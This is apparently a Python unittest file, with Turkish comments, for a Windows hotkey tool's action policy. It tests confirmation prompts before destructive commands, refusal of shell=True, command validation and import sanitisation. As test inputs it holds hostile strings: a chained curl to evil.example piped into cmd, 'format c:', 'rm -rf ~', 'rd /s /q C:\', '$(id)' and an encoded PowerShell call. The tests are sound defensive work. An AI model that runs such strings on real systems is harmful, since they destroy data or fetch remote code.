"""Yikici eylemler (onay), shell=True kaldirma, kullanici komutu dogrulama, ice aktarma onizlemesi.

Windows API'ye ve gercek sureclere dokunulmaz: subprocess.Popen, os.startfile ve ctypes taklit edilir.
"""

from __future__ import annotations

import unittest
from unittest import mock

import _support

from src.core import action_policy as ap
from src.core import hotkey_manager
from _manager_support import ManagerTestCase
from src.utils.settings_manager import prepare_import

ALL_OPTIONS = {"hotkeys": True, "expansions": True, "theme": True, "behavior": True, "update": True}


class DestructiveConfirmationTests(ManagerTestCase):
    def test_declined_destructive_commands_do_nothing(self):
        self.confirm_with(False)
        for command in ap.DESTRUCTIVE_COMMANDS:
            with self.subTest(command=command):
                self.run_command(command)
        self.assertEqual(self.confirm_calls, list(ap.DESTRUCTIVE_COMMANDS))
        self.popen.assert_not_called()
        self.startfile.assert_not_called()
        self.fake_ctypes.windll.shell32.SHEmptyRecycleBinW.assert_not_called()
        self.assertTrue(all("Çalıştırıldı" not in text for _, text in self.events))
        self.assertEqual(len(self.events), len(ap.DESTRUCTIVE_COMMANDS))      # her biri 'iptal edildi' bildirdi

    def test_confirmed_destructive_commands_run_without_shell(self):
        self.confirm_with(True)
        for command in ("bilgisayari_kapat", "yeniden_basla", "oturumu_kapat"):
            self.run_command(command)
        self.assertEqual(self.popen_commands(), [
            ["shutdown", "/s", "/t", "0"],
            ["shutdown", "/r", "/t", "0"],
            ["shutdown", "/l"],
        ])
        for call in self.popen.call_args_list:
            self.assertFalse(call.kwargs.get("shell", False))

    def test_empty_recycle_bin_only_after_confirmation(self):
        self.confirm_with(True)
        self.run_command("cop_kutusunu_bosalt")
        self.fake_ctypes.windll.shell32.SHEmptyRecycleBinW.assert_called_once()

    def test_non_destructive_commands_do_not_prompt(self):
        self.confirm_with(False)
        for command in ("kilitle", "uyku_modu", "hazirda_beklet", "gorev_yoneticisi", "ses_ac", "kopyala"):
            self.run_command(command)
        self.assertEqual(self.confirm_calls, [])

    def test_confirmation_error_denies(self):
        def boom(command):
            raise RuntimeError("diyalog acilamadi")
        self.manager.confirm_destructive = boom
        self.run_command("bilgisayari_kapat")
        self.popen.assert_not_called()

    def test_repeated_trigger_while_dialog_open_is_ignored(self):
        def confirm(command):
            self.confirm_calls.append(command)
            self.run_command("bilgisayari_kapat")        # dialog acikken ikinci tetikleme
            return True
        self.manager.confirm_destructive = confirm
        self.run_command("bilgisayari_kapat")
        self.assertEqual(self.confirm_calls, ["bilgisayari_kapat"])
        self.assertEqual(self.popen.call_count, 1)        # yalnizca asil istek calisti

    def test_default_confirmation_refuses_without_gui(self):
        with mock.patch.object(hotkey_manager.QApplication, "instance", return_value=None):
            self.assertFalse(self.manager._ask_user_to_confirm("bilgisayari_kapat"))

    def test_policy_and_table_stay_in_sync(self):
        table = self.manager._build_command_table()
        self.assertEqual(set(table), set(ap.KNOWN_COMMANDS))
        self.assertTrue(set(ap.DESTRUCTIVE_COMMANDS) <= set(table))


class NoShellTests(ManagerTestCase):
    startfile_fails = True      # ShellExecute basarisiz: tum komutlar Popen yoluna dusmeli

    def test_no_builtin_command_uses_shell(self):
        self.confirm_with(True)
        for command in sorted(ap.KNOWN_COMMANDS):
            self.run_command(command)
        self.assertGreater(self.popen.call_count, 5)
        for call in self.popen.call_args_list:
            self.assertFalse(call.kwargs.get("shell", False), f"shell=True kullanildi: {call}")

    def test_user_program_with_arguments_runs_without_shell(self):
        self.manager.execute_action("run_program", 'ping 8.8.8.8', "Ctrl+1", False)
        self.popen.assert_called_once()
        self.assertEqual(self.popen.call_args.args[0], "ping 8.8.8.8")
        self.assertFalse(self.popen.call_args.kwargs.get("shell", False))

    def test_chained_command_is_never_given_to_a_shell(self):
        self.popen.side_effect = FileNotFoundError("echo bir program degil")
        self.manager.execute_action("run_program", "echo x & curl http://evil.example | cmd", "Ctrl+1", False)
        self.assertTrue(all(c != ["cmd.exe", "/d", "/c", "echo x & curl http://evil.example | cmd"]
                            for c in self.popen_commands()))
        self.assertEqual(self.popen.call_count, 1)                       # kabuk yedegi denenmedi
        self.assertEqual(self.events[-1][0], "error")                    # kullanici bilgilendirildi

    def test_unknown_command_value_gets_same_treatment(self):
        self.popen.side_effect = FileNotFoundError()
        self.run_command("echo x > C:\\Windows\\x.txt")
        self.assertEqual(self.popen.call_count, 1)
        self.assertEqual(self.events[-1][0], "error")

    def test_start_builtin_without_metacharacters_is_allowed_via_cmd(self):
        self.popen.side_effect = [FileNotFoundError("start bir program degil"), mock.Mock()]
        self.manager.execute_action("run_program", 'start "" notepad', "Ctrl+1", False)
        self.assertEqual(self.popen_commands(), ['start "" notepad', ["cmd.exe", "/d", "/c", 'start "" notepad']])
        for call in self.popen.call_args_list:
            self.assertFalse(call.kwargs.get("shell", False))

    def test_control_characters_are_rejected_before_launch(self):
        for bad in ("calc\nformat c:", "calc\rnotepad", "calc\x00notepad"):
            with self.subTest(bad=bad):
                self.manager.execute_action("run_program", bad, "Ctrl+1", False)
        self.popen.assert_not_called()
        self.assertEqual([kind for kind, _ in self.events], ["error"] * 3)

    def test_empty_value_is_ignored(self):
        self.manager._launch_process("   ")
        self.popen.assert_not_called()


class ActionPolicyTests(unittest.TestCase):
    def test_classification(self):
        c = ap.classify_action
        self.assertEqual(c("command", "bilgisayari_kapat"), ap.RISK_DESTRUCTIVE)
        self.assertEqual(c("command", "kopyala"), ap.RISK_NORMAL)
        self.assertEqual(c("command", "format c:"), ap.RISK_CUSTOM_COMMAND)
        self.assertEqual(c("run_program", "calc"), ap.RISK_LAUNCH)
        self.assertEqual(c("open_file", "C:\\a.exe"), ap.RISK_LAUNCH)
        self.assertEqual(c("text", "merhaba"), ap.RISK_NORMAL)
        self.assertEqual(c("kendi_turum", "x"), ap.RISK_INVALID)

    def test_validate_user_command(self):
        self.assertEqual(ap.validate_user_command("  calc  "), "calc")
        for bad in ("", "   ", "a\nb", "a\x00b", "x" * (ap.MAX_COMMAND_LENGTH + 1)):
            with self.subTest(bad=bad[:10]):
                with self.assertRaises(ValueError):
                    ap.validate_user_command(bad)

    def test_shell_fallback_rules(self):
        win = "win32"
        self.assertTrue(ap.shell_fallback_allowed('start "" notepad', win))
        self.assertTrue(ap.shell_fallback_allowed("START chrome https://x.example", win))
        self.assertFalse(ap.shell_fallback_allowed("start x & del y", win))
        self.assertFalse(ap.shell_fallback_allowed("echo hi", win))
        self.assertFalse(ap.shell_fallback_allowed("start x | more", win))
        self.assertFalse(ap.shell_fallback_allowed("start x > out.txt", win))

    def test_shell_semantics_are_explicit_per_platform(self):
        self.assertEqual(ap.shell_argv("start x", "win32"), ["cmd.exe", "/d", "/c", "start x"])
        for plat in ("darwin", "linux"):
            self.assertEqual(ap.shell_argv("ls -l", plat), ["/bin/sh", "-c", "ls -l"])
            # macOS/Linux'ta kabuk yedegi YOK: hicbir komut kabuga verilmez
            for line in ("start x", "echo hi", "ls", "rm -rf ~", "x; y", "$(id)"):
                with self.subTest(platform=plat, line=line):
                    self.assertFalse(ap.shell_fallback_allowed(line, plat))
        for plat in ("win32", "darwin", "linux"):
            policy = ap.shell_policy(plat)
            self.assertTrue(policy.metachars)
            self.assertIn("&", policy.metachars)
            self.assertIn("|", policy.metachars)

    def test_import_preview_flags_risky_actions(self):
        hotkeys = [
            {"shortcut": "Ctrl+1", "action_type": "text", "action_value": "merhaba"},
            {"shortcut": "Ctrl+2", "action_type": "command", "action_value": "bilgisayari_kapat"},
            {"shortcut": "Ctrl+3", "action_type": "run_program", "action_value": "powershell -enc AAAA"},
            {"shortcut": "Ctrl+4", "action_type": "command", "action_value": "rd /s /q C:\\"},
        ]
        preview = ap.build_import_preview(hotkeys, "tr")
        self.assertEqual(preview["risky"], 3)
        self.assertEqual((preview["destructive"], preview["launch"], preview["custom"]), (1, 1, 1))
        self.assertTrue(preview["lines"][0].startswith("• "))
        self.assertTrue(all(line.startswith("⚠ ") for line in preview["lines"][1:]))
        self.assertIn("Bilgisayarı Kapat", preview["lines"][1])
        self.assertIn("powershell -enc AAAA", preview["lines"][2])


class PrepareImportTests(unittest.TestCase):
    def test_invalid_and_unknown_actions_are_dropped_with_reasons(self):
        imported = {
            "hotkeys": [
                {"shortcut": "Ctrl+1", "action_type": "text", "action_value": "a", "enabled": 1, "ekstra": "x"},
                {"shortcut": "Ctrl+2", "action_type": "format_disk", "action_value": "c:"},
                {"action_type": "text", "action_value": "shortcut yok"},
                {"shortcut": "Ctrl+3", "action_type": "text", "action_value": "   "},
                "metin",
            ],
            "expansions": [{"trigger": "mt", "replacement": "x"}, {"trigger": "", "replacement": "y"}],
        }
        plan = prepare_import(imported, ALL_OPTIONS)
        self.assertEqual([h["shortcut"] for h in plan["hotkeys"]], ["Ctrl+1"])
        self.assertEqual(plan["hotkeys"][0], {"shortcut": "Ctrl+1", "action_type": "text", "action_value": "a",
                                              "enabled": True, "is_rich": False})
        self.assertEqual([i for i, _ in plan["dropped_hotkeys"]], [1, 2, 3, 4])
        self.assertEqual([e["trigger"] for e in plan["expansions"]], ["mt"])
        self.assertEqual(len(plan["dropped_expansions"]), 1)

    def test_only_selected_categories_are_applied(self):
        imported = {"hotkeys": [], "theme": "dark", "start_minimized": False}
        plan = prepare_import(imported, {"hotkeys": False, "expansions": False, "theme": True,
                                         "behavior": False, "update": False})
        self.assertEqual(plan["updates"], {"theme": "dark"})

    def test_bad_value_types_and_insecure_update_url_are_rejected(self):
        imported = {"theme": ["dark"], "start_minimized": "evet", "show_notifications": True,
                    "update_url": "http://evil.example/update", "auto_update_check": "1"}
        plan = prepare_import(imported, ALL_OPTIONS)
        self.assertEqual(plan["updates"], {"show_notifications": True})
        self.assertEqual(sorted(plan["rejected"]),
                         ["auto_update_check", "start_minimized", "theme", "update_url"])

    def test_https_update_url_is_accepted(self):
        plan = prepare_import({"update_url": "https://macik.com.tr/api/updates/check"}, ALL_OPTIONS)
        self.assertEqual(plan["updates"]["update_url"], "https://macik.com.tr/api/updates/check")

    def test_exported_auto_update_install_is_imported(self):
        plan = prepare_import({"auto_update_install": False}, ALL_OPTIONS)
        self.assertIs(plan["updates"]["auto_update_install"], False)
        plan = prepare_import({"auto_update_install": "hayir"}, ALL_OPTIONS)
        self.assertEqual(plan["rejected"], ["auto_update_install"])
        plan = prepare_import({"auto_update_install": False}, {**ALL_OPTIONS, "update": False})
        self.assertNotIn("auto_update_install", plan["updates"])

    def test_non_dict_root_raises(self):
        with self.assertRaises(ValueError):
            prepare_import([1, 2, 3], ALL_OPTIONS)


if __name__ == "__main__":
    unittest.main()
